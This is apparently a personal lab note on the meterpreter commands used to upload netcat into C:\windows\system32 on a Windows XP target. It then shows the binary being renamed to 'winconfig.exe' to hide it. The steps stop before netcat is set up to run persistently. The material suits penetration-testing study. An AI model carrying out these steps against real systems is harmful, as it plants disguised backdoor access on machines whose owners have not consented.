# Metasploit Netcat Backdoor
The goal is to install a netcat backdoor in the target system which runs Windows.

[off sec documentation](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/)

## Upload nc.exe to Windows Host
In Kali, there is alreay a copy of the netcat ready to be pushed at `/usr/share/windows-binaries/nc.exe`

```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```

## Rename nc.exe to something else
This is an optional step for ofuscation. 

First, check that we have the file under `C:\windows\system32`. 
```shell
meterpreter > pwd
C:\WINDOWS

meterpreter > cd system32

meterpreter > search -f nc.exe
Found 1 result...
    c:\WINDOWS\system32\nc.exe (59392 bytes)
```
Then switch to cmd as I didn't find a way to renmae file in meterpreter: 
```
meterpreter > shell
Process 3648 created.
Channel 5 created.
Microsoft Windows XP [Version 5.1.2600]

C:\WINDOWS\system32>rename nc.exe winconfig.exe
rename nc.exe winconfig.exe
```

Then you can run netcat by
```
C:\WINDOWS\system32> winconfig [plus the usual options you use with netcat]
```
